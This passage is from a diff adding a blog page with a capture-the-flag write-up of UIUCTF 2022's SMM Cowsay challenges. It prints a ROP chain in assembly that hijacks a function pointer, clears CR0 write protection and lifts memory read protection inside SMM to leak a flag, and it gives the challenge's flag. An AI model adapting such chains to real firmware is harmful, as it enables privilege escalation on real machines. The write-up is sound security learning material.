+    <p>Call SmmClearMemoryAttributes(0x44440000, 0x1000, EFI_MEMORY_RP) to remove the Read Protection (check the file 0005-PiSmmCpuDxeSmm-Protect-flag-addresses.patch)</p>
+  </li>
+  <li>
+    <p>Call Cowsay(0x44440000, 60) to dump the flag and profit!</p>
+  </li>
+</ol>
+
+<p>With the help of <a href="https://github.com/sashs/Ropper">Ropper</a> and <a href="https://github.com/Ben-Lichtman/ropr">ropr</a> we find all the gadgets we need to perform these 4 steps, except the stack pivoting one that was found manually by Paul (probably after staring for just 5 minutes at the output of <code class="language-plaintext highlighter-rouge">xxd SmmCowsay.efi</code>).</p>
+
+<p>Overall, the following are the highlights of the <a href="/blog/assets/code/SMM-Cowsay2-exploit.S">final exploit</a>:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+     <span class="c1">; MessageLength</span>
+     <span class="nf">mov</span> <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nv">r12</span><span class="o">+</span><span class="mh">0x10</span><span class="p">],</span> <span class="mi">416</span>
+
+     <span class="c1">; Data</span>
+     <span class="nf">mov</span> <span class="nb">rcx</span><span class="p">,</span> <span class="mi">400</span>
+     <span class="nf">lea</span> <span class="nb">rdi</span><span class="p">,</span> <span class="p">[</span><span class="nv">r12</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>
+     <span class="nf">lea</span> <span class="nb">rsi</span><span class="p">,</span> <span class="p">[</span><span class="nv">rip</span> <span class="o">+</span> <span class="nv">rop_chain</span><span class="p">]</span>
+     <span class="nf">rep</span> <span class="nv">movsb</span>
+
+     <span class="c1">; This will overwrite the function ptr CowsayFunc.</span>
+     <span class="c1">; The address points to the stack pivot gadget.</span>
+     <span class="nf">mov</span> <span class="p">[</span><span class="nv">r12</span><span class="o">+</span><span class="mh">0x18</span><span class="o">+</span><span class="mi">400</span><span class="p">],</span> <span class="mh">0x7fcc068</span>
+
+     <span class="c1">; set up Communicate param + call [rax], as before</span>
+<span class="nf">...</span>
+
+<span class="nl">rop_chain:</span>
+    <span class="nf">.long</span> <span class="mh">0xAABBCCDD</span>
+    <span class="nf">.long</span> <span class="mh">0x11223344</span>
+
+    <span class="nf">.quad</span> <span class="mh">0x7f8a184</span> <span class="o">//</span> <span class="nv">pop</span> <span class="nb">rax</span><span class="c1">; ret</span>
+    <span class="nf">.quad</span> <span class="mh">0x80000033</span>
+    <span class="nf">.quad</span> <span class="mh">0x7fcf6ef</span> <span class="o">//</span> <span class="nv">mov</span> <span class="nb">cr0</span><span class="p">,</span> <span class="nb">rax</span><span class="c1">; ret</span>
+
+    <span class="nf">.quad</span> <span class="mh">0x7f8ea1c</span> <span class="o">//</span> <span class="nv">pop</span> <span class="nb">rdx</span><span class="c1">; pop rcx; pop rbx; ret</span>
+    <span class="nf">.quad</span> <span class="mh">0x1000</span>
+    <span class="nf">.quad</span> <span class="mh">0x44440000</span>
+    <span class="nf">.quad</span> <span class="mh">0xAABBCCDD</span>
+
+    <span class="nf">.quad</span> <span class="mh">0x7f84129</span> <span class="o">//</span> <span class="nv">pop</span> <span class="nv">r8</span><span class="c1">; xor eax, eax; pop rsi; pop rdi; ret;</span>
+    <span class="nf">.quad</span> <span class="mh">0x2000</span><span class="nv">ULL</span> <span class="o">//</span> <span class="nv">EFI_MEMORY_RP</span>
+    <span class="nf">.quad</span> <span class="mh">0xAABBCCDD</span>
+    <span class="nf">.quad</span> <span class="mh">0xAABBCCDD</span>
+    <span class="nf">.quad</span> <span class="mh">0x7fc6743</span> <span class="o">//</span> <span class="nv">SmmClearMemoryAttributes</span>
+
+    <span class="nf">.quad</span> <span class="mh">0x7f8ea1c</span> <span class="o">//</span> <span class="nv">pop</span> <span class="nb">rdx</span><span class="c1">; pop rcx; pop rbx; ret</span>
+    <span class="nf">.quad</span> <span class="mh">0x60</span>
+    <span class="nf">.quad</span> <span class="mh">0x44440001</span>
+    <span class="nf">.quad</span> <span class="mh">0xAABBCCDD</span>
+
+    <span class="nf">.quad</span> <span class="mh">0x7ee9463</span> <span class="o">//</span> <span class="nv">CowSay</span>
+
+<span class="nl">rop_chain.end:</span>
+</code></pre></div></div>
+
+<p>As with SMM Cowsay 1, don’t forget to leak the odd indexes of the flag, and zip the two parts to get the final flag <code class="language-plaintext highlighter-rouge">uiuctf{dont_try_this_at_home_I_mean_at_work_5dfbf3eb}</code>.</p>
+
+<h2 id="conclusions">Conclusions</h2>
+<p>What a fun challenges—I really like challenges divided in multiple steps, were you keep refining some knowledge about a system to solve increasingly difficult problems. Moreover, these systems challenge and really my favourite, I always end up going down several rabbit holes that make me learn about interesting and super-low-level concepts.</p>
+
+<p>Thanks to <code class="language-plaintext highlighter-rouge">YiFei Zhu</code> for this great challenges!</p>
+
+  </div><a class="u-url" href="/blog/2022/08/07/smm-cowsay-1-and-2-uiuctf-2022.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/blog/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="/blog/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/blog/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">Fabio Pagani</li>
+          <li><a class="u-email" href="mailto:pagabuc@gmail.com">pagabuc@gmail.com</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Mostly security
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"></ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
